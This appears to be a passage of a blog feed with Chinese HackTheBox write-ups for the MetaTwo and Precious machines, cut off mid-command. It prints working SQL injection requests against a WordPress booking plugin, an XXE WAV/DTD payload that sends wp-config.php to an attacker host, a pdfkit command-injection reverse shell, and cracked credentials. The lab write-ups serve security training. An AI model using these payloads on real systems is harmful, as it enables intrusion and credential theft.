class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53d6af62fd48af558d4bd82282e5c668</span><br></pre></td></tr></table></figure><hr /><blockquote><p>错误方法，正确答案</p></blockquote><p>当时查出来的user表看着很怪，但是还是能登入player账户（获取WebShell之后可以看<code>/etc/passwd</code>或者<code>/home/</code>得知player用户的存在），就没去看soccer_db了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select user, password from mysql.user;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#39;password&#39; in &#39;field list&#39;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /root/app/server.js</span><br><span class="line">...</span><br><span class="line">const query = `Select id,username,password  FROM accounts <span class="built_in">where</span> id = <span class="variable">$&#123;id&#125;</span>`;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from soccer_db.accounts;</span><br><span class="line">+------+-------------------+----------+----------------------+</span><br><span class="line">| id   | email             | username | password             |</span><br><span class="line">+------+-------------------+----------+----------------------+</span><br><span class="line">| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |</span><br><span class="line">+------+-------------------+----------+----------------------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select user from mysql.user;</span><br><span class="line">+------------------+</span><br><span class="line">| user             |</span><br><span class="line">+------------------+</span><br><span class="line">| debian-sys-maint |</span><br><span class="line">| mysql.infoschema |</span><br><span class="line">| mysql.session    |</span><br><span class="line">| mysql.sys        |</span><br><span class="line">| player           |</span><br><span class="line">| root             |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_MetaTwo</title>
    <link href="https://yoloyolo.top/2023/03/02/HackTheBox-MetaTwo/"/>
    <id>https://yoloyolo.top/2023/03/02/HackTheBox-MetaTwo/</id>
    <published>2023-03-02T03:41:22.000Z</published>
    <updated>2023-03-02T16:57:31.683Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><h1 id="hackthebox_metatwo"><a class="markdownIt-Anchor" href="#hackthebox_metatwo"></a> HackTheBox_MetaTwo</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.186</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.186</span><br><span class="line">Host is up (1.1s latency).</span><br><span class="line">Not shown: 828 closed ports, 169 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.18.0</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port21-TCP:V&#x3D;7.70%I&#x3D;7%D&#x3D;3&#x2F;2%Time&#x3D;64009A16%P&#x3D;x86_64-pc-linux-gnu%r(Gener</span><br><span class="line">SF:icLines,8F,&quot;220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\.</span><br><span class="line">SF:11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea</span><br><span class="line">SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\</span><br><span class="line">SF:r\n&quot;);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3><p>请求WEB页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.11.186 -I</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx&#x2F;1.18.0</span><br><span class="line">Date: Thu, 02 Mar 2023 12:39:11 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 145</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;metapress.htb&#x2F;</span><br></pre></td></tr></table></figure><p>跳转至域名<code>metapress.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.186\tmetapress.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>访问页面是个Wordpress，没必要枚举了</p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>枚举用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url <span class="string">&quot;http://metapress.htb/&quot;</span> -e u</span><br></pre></td></tr></table></figure><p>部分信息如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[+] robots.txt found: http:&#x2F;&#x2F;metapress.htb&#x2F;robots.txt</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - &#x2F;wp-admin&#x2F;</span><br><span class="line"> |  - &#x2F;wp-admin&#x2F;admin-ajax.php</span><br><span class="line"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line"> [+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;metapress.htb&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.6.2&lt;&#x2F;generator&gt;</span><br><span class="line"> |  - http:&#x2F;&#x2F;metapress.htb&#x2F;comments&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.6.2&lt;&#x2F;generator&gt;</span><br><span class="line"></span><br><span class="line"> [+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;metapress.htb&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Rss Generator (Aggressive Detection)</span><br><span class="line"> |  Author Sitemap (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;metapress.htb&#x2F;wp-sitemap-users-1.xml</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] manager</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>访问页面<code>http://metapress.htb/events/</code></p><p>在HTML代码中找到以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;metapress.htb&#x2F;wp-content&#x2F;plugins&#x2F;bookingpress-appointment-booking&#x2F;css&#x2F;bookingpress_element_theme.css?ver&#x3D;1.0.10</span><br></pre></td></tr></table></figure><p>确定该插件为 <code>bookingpress-appointment-booking 1.0.10</code></p><p>google得到相关漏洞</p><blockquote><p><a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357</a></p></blockquote><p>源代码中搜索<code>action:'bookingpress_front_get_category_services'</code></p><p>得到_wpnonce=7ea553b73c</p><p>进行手工SQL注入</p><p>查库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,5,group_concat(schema_name) from information_schema.schemata-- -&#x27;</span></span><br></pre></td></tr></table></figure><p>库名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">information_schema</span><br><span class="line">blog</span><br></pre></td></tr></table></figure><p>查表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,5,group_concat(table_name) from information_schema.tables where table_schema=0x626c6f67-- -&#x27;</span></span><br></pre></td></tr></table></figure><p>blog库表名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">wp_options</span><br><span class="line">wp_term_taxonomy</span><br><span class="line">wp_bookingpress_servicesmeta</span><br><span class="line">wp_commentmeta</span><br><span class="line">wp_users</span><br><span class="line">wp_bookingpress_customers_meta</span><br><span class="line">wp_bookingpress_settings</span><br><span class="line">wp_bookingpress_appointment_bookings</span><br><span class="line">wp_bookingpress_customize_settings</span><br><span class="line">wp_bookingpress_debug_payment_log</span><br><span class="line">wp_bookingpress_services</span><br><span class="line">wp_termmeta</span><br><span class="line">wp_links</span><br><span class="line">wp_bookingpress_entries</span><br><span class="line">wp_bookingpress_categories</span><br><span class="line">wp_bookingpress_customers</span><br><span class="line">wp_bookingpress_notifications</span><br><span class="line">wp_usermeta</span><br><span class="line">wp_terms</span><br><span class="line">wp_bookingpress_default_daysoff</span><br><span class="line">wp_comments</span><br><span class="line">wp_bookingpress_default_workhours</span><br><span class="line">wp_postmeta</span><br><span class="line">wp_bookingpress_form_fields</span><br><span class="line">wp_bookingpress_payment_logs</span><br><span class="line">wp_posts</span><br><span class="line">wp_term_relationships</span><br></pre></td></tr></table></figure><p>查列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_schema=0x626c6f67 and table_name=0x77705f7573657273-- -&#x27;</span></span><br></pre></td></tr></table></figure><p>blog库wp_users表列名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ID</span><br><span class="line">user_login</span><br><span class="line">user_pass</span><br><span class="line">user_nicename</span><br><span class="line">user_email</span><br><span class="line">user_url</span><br><span class="line">user_registered</span><br><span class="line">user_activation_key</span><br><span class="line">user_status</span><br><span class="line">display_name</span><br></pre></td></tr></table></figure><p>查账户信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,group_concat(user_login),group_concat(user_pass) from blog.wp_users-- -&#x27;</span></span><br></pre></td></tr></table></figure><p>用户名与密码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.</span><br><span class="line">manager:$P$B4aNM28N0E.tMy&#x2F;JIcnVMZbGcU16Q70</span><br></pre></td></tr></table></figure><p><strong>读出来的json里面，&quot;/“会被转义为”\/&quot;</strong></p><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.\n$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70&#x27;</span> &gt; <span class="built_in">hash</span></span><br><span class="line">hashcat -m 400 ./<span class="built_in">hash</span> /usr/share/wordlist/rockyou.txt</span><br></pre></td></tr></table></figure><p>得到manager的账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manager:partylikearockstar</span><br></pre></td></tr></table></figure><p>根据之前wpscan的结果，可以找到wordpress 5.6.2 XXE漏洞</p><blockquote><p><a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5</a><br /><a href="https://www.sonarsource.com/blog/wordpress-xxe-security-vulnerability/">https://www.sonarsource.com/blog/wordpress-xxe-security-vulnerability/</a><br /><a href="https://github.com/motikan2010/CVE-2021-29447">https://github.com/motikan2010/CVE-2021-29447</a></p></blockquote><p>这个漏洞需要认证，即用户登陆状态才能出发</p><p>构造wav文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -en <span class="string">&#x27;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;http://10.10.*.*/xxe.dtd&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;&gt;%remote;%param1;%exfil;] &gt;\x00&#x27;</span>&gt; malicious.wav</span><br></pre></td></tr></table></figure><p>构造xxe.dtd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;wp-config.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#37; exfil SYSTEM &#39;http:&#x2F;&#x2F;10.10.*.*&#x2F;?%data;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>媒体库中上传wav文件即可出发XXE漏洞</p><p>得到FTP账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metapress.htb:9NYS_ii@FyL_p5M2NvJ</span><br></pre></td></tr></table></figure><p>登录FTP并获取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.11.186</span><br><span class="line">metapress.htb</span><br><span class="line">9NYS_ii@FyL_p5M2NvJ</span><br><span class="line"><span class="built_in">cd</span> mailer</span><br><span class="line">get send_email.php</span><br></pre></td></tr></table></figure><p>得到以下账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jnelson@metapress.htb:Cb4_JmWM8zUZWMu@Ys</span><br></pre></td></tr></table></figure><p>尝试用于登录SSH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh jnelson@10.10.11.186</span><br><span class="line">Cb4_JmWM8zUZWMu@Ys</span><br></pre></td></tr></table></figure><p>登陆成功</p><p>获取user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /home/jnelson/user.txt </span><br><span class="line">1d67d6f8d41d206a8fb29e4570a4b6e2</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/jnelson/password </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">credentials:</span><br><span class="line">- comment: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  fullname: root@ssh</span><br><span class="line">  login: root</span><br><span class="line">  modified: 2022-06-26 08:58:15.621572</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode <span class="string">&#x27;p7qfAZt4_A1xo_0x&#x27;</span></span><br><span class="line">- comment: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  fullname: jnelson@ssh</span><br><span class="line">  login: jnelson</span><br><span class="line">  modified: 2022-06-26 08:58:15.514422</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode <span class="string">&#x27;Cb4_JmWM8zUZWMu@Ys&#x27;</span></span><br><span class="line">handler: passpie</span><br><span class="line">version: 1.0</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">p7qfAZt4_A1xo_0x</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt </span><br><span class="line">686e0b48d30c2092e9ecc70f97a0086f</span><br></pre></td></tr></table></figure><hr /><p>Easiest privilege escalation ever.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Precious</title>
    <link href="https://yoloyolo.top/2023/03/02/HackTheBox-Precious/"/>
    <id>https://yoloyolo.top/2023/03/02/HackTheBox-Precious/</id>
    <published>2023-03-01T23:12:08.000Z</published>
    <updated>2023-03-08T13:15:25.073Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><h1 id="hackthebox_precious"><a class="markdownIt-Anchor" href="#hackthebox_precious"></a> HackTheBox_Precious</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.189</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for precious.htb (10.10.11.189)</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.18.0</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3><p>未枚举出路径</p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>访问80端口的WEB服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.189/ -I</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx&#x2F;1.18.0</span><br><span class="line">Date: Thu, 02 Mar 2023 02:20:41 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 145</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;precious.htb&#x2F;</span><br></pre></td></tr></table></figure><p>跳转至域名precious.htb</p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.189\tprecious.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>使用域名可以进行访问</p><p>本地开启HTTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp &amp;&amp; python -m http.server 80</span><br></pre></td></tr></table></figure><p>将本地HTTP服务页面转为PDF</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://precious.htb -d <span class="string">&quot;url=http://10.10.*.*/&quot;</span> -o pdf</span><br></pre></td></tr></table></figure><p>查看文件EXIF信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool pdf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ExifTool Version Number         : 11.16</span><br><span class="line">File Name                       : pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 22 kB</span><br><span class="line">File Modification Date&#x2F;Time     : 2023:03:02 10:42:26+08:00</span><br><span class="line">File Access Date&#x2F;Time           : 2023:03:02 10:42:33+08:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2023:03:02 10:42:26+08:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application&#x2F;pdf</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Linearized                      : No</span><br><span class="line">Page Count                      : 1</span><br><span class="line">Creator                         : Generated by pdfkit v0.8.6</span><br></pre></td></tr></table></figure><p>搜索<code>pdfkit v0.8.6</code>，找到相关漏洞CVE-2022-25765</p><blockquote><p><a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795</a></p></blockquote><p>验证漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://precious.htb/ -d <span class="string">&quot;url=http%3A//10.10.*.*/%3Fname%3D%2520%60id%60&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.189 - - [02&#x2F;Mar&#x2F;2023 11:34:00] &quot;GET &#x2F;?name&#x3D;%20uid&#x3D;1001(ruby)%20gid&#x3D;1001(ruby)%20groups&#x3D;1001(ruby) HTTP&#x2F;1.1&quot; 200 -</span><br></pre></td></tr></table></figure><p>反弹Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://precious.htb/ -d <span class="string">&quot;url=http%3A//10.10.*.*/%3Fname%3D%2520%60python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2710.10.*.*%27%2C9998%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27/bin/bash%27%2C%27-i%27%5D%29%3B%22%60&quot;</span></span><br></pre></td></tr></table></figure><p>获取tty</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 